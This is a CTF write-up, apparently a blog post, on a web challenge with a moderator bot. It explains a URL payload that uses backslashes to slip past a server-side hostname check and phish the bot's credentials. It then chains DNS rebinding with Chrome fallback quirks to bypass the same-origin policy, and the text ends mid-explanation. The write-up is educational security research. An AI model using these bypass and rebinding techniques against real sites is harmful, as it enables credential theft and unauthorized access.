<p>Challenge Author: pilvar</p>

<h2 id="introduction">Introduction</h2>

<p>There are quite a lot of files in this challenge. Below is reported a tree structure of it. Some files, like the Dockerfile, are removed for brevity.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.
├── fishing-bot/
│   ├── bot.py
│   └── main.py
└── fishing-web/
    ├── models/
    │   ├── post.js
    │   └── user.js
    ├── routes/
    │   ├── admin.js
    │   ├── auth.js
    │   ├── moderator.js
    │   └── posts.js
    ├── server.js
    └── views/
        ├── register.ejs
        ├── login.ejs
        ├── post.ejs
        ├── new-post.ejs
        ├── logs.ejs
        ├── index.ejs
        └── flag.ejs
</code></pre></div></div>

<p>The challenge emulates a scenario with a bot. Since this was an 8 hour CTF we tried to track down what we need to do in a really quick way.
We started by analyzing the bot’s source code.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">visit</span><span class="p">(</span><span class="n">postId</span><span class="p">):</span>
  <span class="n">chrome_options</span><span class="o">=</span><span class="n">webdriver</span><span class="p">.</span><span class="n">ChromeOptions</span><span class="p">()</span>
  <span class="n">chrome_options</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--headless"</span><span class="p">)</span>
  <span class="n">chrome_options</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--no-sandbox"</span><span class="p">)</span>
  <span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">chrome_options</span><span class="o">=</span><span class="n">chrome_options</span><span class="p">)</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://fishing-web:3000/posts/"</span><span class="o">+</span><span class="n">postId</span><span class="p">)</span>
  <span class="n">wait</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">execute_script</span><span class="p">(</span><span class="s">'document.querySelectorAll("a").forEach(a =&gt; {if (a.innerText == "[Login to view this content]") {a.click(); return}})'</span><span class="p">)</span>
  <span class="n">wait</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="n">driver</span><span class="p">.</span><span class="n">current_url</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"/login"</span><span class="p">):</span>
    <span class="n">driver</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
    <span class="k">return</span>
  <span class="n">usernameEl</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">"username"</span><span class="p">)</span>
  <span class="n">usernameEl</span><span class="p">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'MODERATOR_USERNAME'</span><span class="p">])</span>
  <span class="n">passwordEl</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">"password"</span><span class="p">)</span>
  <span class="n">passwordEl</span><span class="p">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'MODERATOR_PASSWORD'</span><span class="p">])</span>
  <span class="n">butEl</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">"submitbut"</span><span class="p">)</span>
  <span class="n">butEl</span><span class="p">.</span><span class="n">click</span><span class="p">()</span>
  <span class="n">wait</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
</code></pre></div></div>

<p>The bot code is pretty simple. All it does is:</p>

<ul>
  <li>Visit one user supplied post</li>
  <li>Waits for 3 seconds</li>
  <li>Search in the DOM for all the <mark class="hltr-orange">anchor tags</mark> and click only on those which contains a certain string</li>
  <li>Waits for 3 seconds</li>
  <li>Checks if the current URL ends with <code class="language-plaintext highlighter-rouge">/login</code> and if it does, the bot inserts username and password and logs in</li>
  <li>Waits for 10 seconds</li>
</ul>

<p>It’s straightforward at this point that the post is our entrypoint for the exploit chain. Let’s check how a post is created.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">create</span><span class="p">:</span> <span class="p">(</span><span class="nx">title</span><span class="p">,</span> <span class="nx">author</span><span class="p">,</span> <span class="nx">content</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">id</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">)</span>
        <span class="kd">const</span> <span class="nx">insertPostQuery</span> <span class="o">=</span> <span class="s2">`
            INSERT INTO posts (id, title, author, content, approved) VALUES (?, ?, ?, ?, ?)
        `</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nb">window</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JSDOM</span><span class="p">(</span><span class="dl">''</span><span class="p">).</span><span class="nb">window</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">DOMPurify</span> <span class="o">=</span> <span class="nx">createDOMPurify</span><span class="p">(</span><span class="nb">window</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">sanitizedContent</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">content</span><span class="p">,</span> <span class="p">{</span><span class="na">ALLOWED_TAGS</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">],</span> <span class="na">ALLOWED_ATTR</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">href</span><span class="dl">'</span><span class="p">]});</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">db</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">insertPostQuery</span><span class="p">,</span> <span class="p">[</span><span class="nx">id</span><span class="p">,</span> <span class="nx">title</span><span class="p">,</span> <span class="nx">author</span><span class="p">,</span> <span class="nx">sanitizedContent</span><span class="p">,</span> <span class="kc">false</span><span class="p">],</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">reject</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nx">resolve</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">});</span>
        <span class="p">});</span>
    <span class="p">},</span>
</code></pre></div></div>

<p>This is the function that is used to create a post. The content of the post is sanitized via <mark class="hltr-orange">DOMPurify</mark>. Moreover the only html tag allowed is the anchor tag with the href attribute.
This should not be a problem, because it’s more than enough to trick the admin into a malicious link. Right?</p>

<p>Well, this is not that easy, otherwise it would have ended with more than 1 solve.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/:postId</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">postId</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">postId</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">isAuth</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findByUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findByUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)).</span><span class="nx">permissions</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">isMod</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findByUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findByUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)).</span><span class="nx">permissions</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">moderator</span><span class="dl">'</span><span class="p">)</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">post</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Post</span><span class="p">.</span><span class="nx">getById</span><span class="p">(</span><span class="nx">postId</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">post</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Post not found</span><span class="dl">'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="kd">const</span> <span class="nx">dom</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JSDOM</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;p id=content&gt;</span><span class="dl">"</span><span class="o">+</span><span class="nx">post</span><span class="p">.</span><span class="nx">content</span><span class="o">+</span><span class="dl">"</span><span class="s2">&lt;/p&gt;</span><span class="dl">"</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nx">dom</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">content</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">content</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">a</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">parse</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">href</span><span class="p">).</span><span class="nx">hostname</span> <span class="o">!==</span> <span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">host</span><span class="p">).</span><span class="nx">hostname</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">isAuth</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">a</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">[Login to view this content]</span><span class="dl">"</span>
                    <span class="nx">a</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">a</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">[Login to view this content]</span><span class="dl">"</span>
                <span class="nx">a</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">});</span>

        <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="nx">post</span><span class="p">,</span> <span class="na">content</span><span class="p">:</span> <span class="nx">content</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">,</span> <span class="nx">isMod</span> <span class="p">});</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Internal Server Error</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<p>This is the route responsible for showing a certain post. As you can see, the content of the post is inserted into a <mark class="hltr-orange">JSDOM</mark> object and parsed. 
The route checks if the href attribute of every anchor tag is the same as the host header for the current request.
If this check fails, the href is changed to <code class="language-plaintext highlighter-rouge">/login</code>.</p>

<p>How can we bypass this check? Is it really bypassable?</p>

<h2 id="parsing-differential-made-easy">Parsing Differential Made Easy</h2>

<p>During the competition we weren’t able to find errors in the parsing function. After the CTF i  reversed the exploit given by @pilvar and i’ve found out what exactly it’s going on.</p>

<p>We have two parsers that take places here. Wait, what? The parser in the source code is only one, so why two?
This is indeed correct, but the second parsing is performed by <mark class="hltr-orange">Chromium</mark> when creating the HTML page.
Since we have two parsers maybe it’s possible to have a parser differential. That is exactly what we were missing during the competition.</p>

<p>Chromium has this <mark class="hltr-orange">behaviour</mark> where it converts every <code class="language-plaintext highlighter-rouge">\</code> into <code class="language-plaintext highlighter-rouge">/</code> in the href of an anchor tag. I honestly don’t know why it happens, maybe is related to some compatibility issues.
This is extremely interesting. That’s because the forward slash character is used as terminator for the <mark class="hltr-orange">authority component</mark> of the URL, as stated <a href="https://datatracker.ietf.org/doc/html/rfc3986#section-3.2">here</a>. While the back slash character is considered a normal character, and it not have any special meaning</p>

<p>Consider the following example, using the same parse function used in the challenge.
The parse function is taken from the <mark class="hltr-orange">tldts</mark> library.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nx">parse</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://example.com:9999</span><span class="se">\\</span><span class="s2">@blig.one:8000/</span><span class="dl">"</span><span class="p">).</span><span class="nx">hostname</span>
<span class="dl">"</span><span class="s2">blig.one</span><span class="dl">"</span>
<span class="o">&gt;</span> <span class="nx">parse</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://example.com:9999/@blig.one:8000/</span><span class="dl">"</span><span class="p">).</span><span class="nx">hostname</span>
<span class="dl">"</span><span class="s2">example.com</span><span class="dl">"</span> 
</code></pre></div></div>

<p>So, we know that Chromium performs this magic conversion automatically. We can leverage this behaviour to bypass the aforementioned check, with a payload like the following:</p>

<p><code class="language-plaintext highlighter-rouge">\\\\exploit-domain:9999\\x@fishing-web:3000/../</code></p>

<p>This will result in <code class="language-plaintext highlighter-rouge">fishing-web</code> as hostname when parsed server side, but on the browser the hostname will be our domain with the exploit. Thus, when the bot will click on the link will land on our <mark class="hltr-orange">malicious domain</mark>.</p>

<p>In a strict sense, this is not a parsing differential. Because the string parsed will not be the same on server-side and on the browser. Calling it <mark class="hltr-orange">Chromium hostname shenanigans</mark> would fit better.</p>

<h2 id="phished-now-what">Phished. Now what?</h2>

<p>Right now we can force the bot to visit our domain. If you recall what is the bot flow, if the domain ends with <code class="language-plaintext highlighter-rouge">/login</code> he writes his username and password. We can steal his credentials.
With his credentials we can impersonate the bot, right?</p>

<p>You guessed right. The answer is <mark class="hltr-orange">no</mark></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="p">{</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">username</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">password</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"error":"Bad Request"}</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findByUsername</span><span class="p">(</span><span class="nx">username</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">user</span> <span class="o">=</span> <span class="p">{}</span>
            <span class="nx">user</span><span class="p">.</span><span class="nx">permissions</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">([</span><span class="dl">"</span><span class="s2">user</span><span class="dl">"</span><span class="p">])</span>
            <span class="nx">user</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">$2b$10$XeKD8ih3RR3aZUA7iHhZfe.MiOKRfkf7ViY0qr2h2lv/AD9OU2msK</span><span class="dl">"</span> <span class="c1">// error out but keep the bcrypt check to avoid side channel, this hash is not brute-foceable</span>
        <span class="p">}</span>
        <span class="nx">user</span><span class="p">.</span><span class="nx">permissions</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">permissions</span><span class="p">)</span>
        <span class="kd">const</span> <span class="nx">match</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">bcrypt</span><span class="p">.</span><span class="nx">compare</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span> <span class="nx">user</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">match</span> <span class="o">&amp;&amp;</span> <span class="nx">user</span><span class="p">.</span><span class="nx">ip</span> <span class="o">==</span> <span class="nx">req</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">remoteAddress</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^.*:/</span><span class="p">,</span> <span class="dl">''</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">{}</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"error":"Invalid username or password or ip"}</span><span class="dl">'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"error":"Internal Server Error"}</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<p>When the user is created, among other information, the user IP is saved. When trying to perform a login there is a strict IP check.
This means that, even if we can steal the bot’s credentials we cannot login with his profile.</p>

<p>Ok, so maybe we can try to steal the cookie? Even this path is unfeasible, since the cookie is  <mark class="hltr-orange">SameSite=Strict</mark> and <mark class="hltr-orange">HttpOnly</mark>.</p>

<p>This is the second roadblock. The solution to this part is something that literally blew my mind. So get ready for <mark class="hltr-orange">DNS Rebinding</mark>.</p>

<h2 id="dns-rebinding-made-not-so-easy">DNS Rebinding Made Not So Easy</h2>

<p>One thing at a time. DNS Rebinding is a method of manipulating resolution of domain names.
The attacker registers a domain (such as local.blig.one) and delegates it to a DNS Server that is under the attacker’s control. The server is configured to respond with a very short Time-To-Live (TTL), preventing the DNS response from being cached. When the victim browses to the malicious domain, the attacker’s DNS server <mark class="hltr-orange">first responds</mark> with the IP address of a server hosting the malicious client-side code.</p>

<p>The malicious client-side code makes additional accesses to the original domain name (such as local.blig.one). These are permitted by the <mark class="hltr-orange">same-origin policy</mark>. However, when the victim’s browser runs the script it makes a new DNS request for the domain, and the attacker replies with a new IP address. For instance, they could reply with an internal IP address or the IP address of a target somewhere else on the Internet.</p>

<p>With this trick is possible to bypass the SOP under some circumstances. While i’ve known about DNS Rebinding as a trick to apply while testing for SSRFs, i’ve never thought this could have been used for a SOP bypass.</p>

<p>But it’s indeed possible. We just need to take a tiny shrewdness here. Apparently Chromium prefers <mark class="hltr-orange">local resolutions</mark> over remote ones. This means that if a certain domain responds with two A record the local IP address will be preferred over the remote one.</p>

<p>What we need is a second domain (let’s say exploit.blig.one) that points only towards our exploit server. At this point the attack flow is the following:</p>

<ul>
  <li>Phish the admin to exploit.blig.one</li>
  <li>The window opens another window via javascript</li>
  <li>The openee can redirect the opener to local.blig.one which is the domain that responds with two A record</li>
  <li>Since one of the two A record is the local IP of the bot, the bot will land on the challenge page and will perform the login.</li>
</ul>

<p>Now we have a logged in bot, but the two opened windows are in cross origin since one is  local.blig.one and the other is exploit.blig.one.</p>

<h2 id="phished-rebinded-now-what-">Phished. Rebinded. Now What ?</h2>

<p>We cannot control that much inside the opened window on the challenge page. At this point the only advantage that we have is the fact that the bot is now logged in, but we cannot make him performing any sensitive actions.</p>

<p>Since the two windows are in a openee-opener relationship, they both can redirect each other. If you recall how DNS Rebinding works, if we keep the same domain but we make it resolve to a different IP address we can theoretically bypass the SOP and maintain a valid cookie.</p>

<p>But, as said before, the domain local.blig.one will respond with two A record one of which is a local address for the bot.
We need to find a way that tricks the bot to prefer the remote IP over the local one.</p>

<p>In this challenge there is a gadget that helps us.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/logs</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">logs</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Not implemented yet</span><span class="dl">"</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">logs</span><span class="dl">'</span><span class="p">,</span> <span class="nx">logs</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<p>This route is in the  <code class="language-plaintext highlighter-rouge">moderator.js</code> file. While testing various thing with the application we have found out that, if a user with the required permission to hit this endpoint tries to navigate to it, the application crashes.
This is due to the fact that logs is a <mark class="hltr-orange">string</mark> and not an object.</p>

<p>Why this can help us? This is due to another Chromium quirk. Take this with a grain of salt, because i haven’t dig deeper into this, but if a request that resolves with two A record fails on the first IP it is sent also to the second IP.</p>

<p>In our case this means that, if the local request fails, the same request will be sent on the remote IP, which hosts our exploit server.
The mind blown facts is that we are in same origin with the previous page.</p>

<h2 id="if-you-think-about-it-very-carefully-but-for-more-than-8-hours">If you think about it very carefully, but for more than 8 hours</h2>

<p>At this point it’s similar to have an XSS in same origin with the challenge page. We force the bot to fetch the flag endpoint and we are done, aren’t we?</p>

<p>You guessed right once again, the answer is <mark class="hltr-orange">indeed no</mark>.</p>

<p>Why? Because there are some countermeasures for this <mark class="hltr-orange">threat model</mark> inside Chrome. The quirk here is the fact that not all countermeasures outlined <a href="https://wicg.github.io/private-network-access/">here</a> are already in place.</p>

<p>The neat part is the fact that while the Fetch API won’t work in this situation, an <mark class="hltr-orange">iframe</mark> is not restricted by any means. Moreover, if a script tag is injected into an iframe it is possible to use the Fetch API normally. 
This research can be explored further <a href="https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari">here</a></p>

<p>So, is it correct to say that all we need is to create an iframe? Yes, but actually no. If we will perform a fetch right now it will land on our exploit server, and we don’t want that.</p>

<p><em>But you said that the local resolutions are preferred over the remote ones.</em></p>

<p>That’s indeed correct, but there is not only the DNS cache in place here. There is an inner Chrome cache that saves the previous resolutions. Again i didn’t dig in the Chrome internal that much (yet), but that’s my understanding.</p>

<p>To bypass this, we can use the same trick that we have used previously, but this time against ourselves. 
We can make our own server crash, so that the request will land on the challenge server, due to what i have explained before.</p>

<p>Is this the end, right?</p>

<h2 id="js-shenanigans-my-beloved">JS Shenanigans my beloved</h2>

<p>Plot twist, the bot <mark class="hltr-orange">cannot fetch</mark> the flag. That’s because this is the route that handles the flag rendering.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findByUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">))</span> <span class="o">||</span> <span class="o">!</span><span class="p">((</span><span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findByUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)).</span><span class="nx">permissions</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">administrator</span><span class="dl">'</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Unauthorized</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">next</span><span class="p">();</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">flag</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">flag</span><span class="p">:</span> <span class="nx">FLAG</span><span class="p">});</span>
<span class="p">})</span>
</code></pre></div></div>

<p>Only admin users can fetch the flag. Our bot is just a moderator, so he cannot fetch the flag himself.</p>

<p>By analyzing what the administrator can do, we came across this:</p>

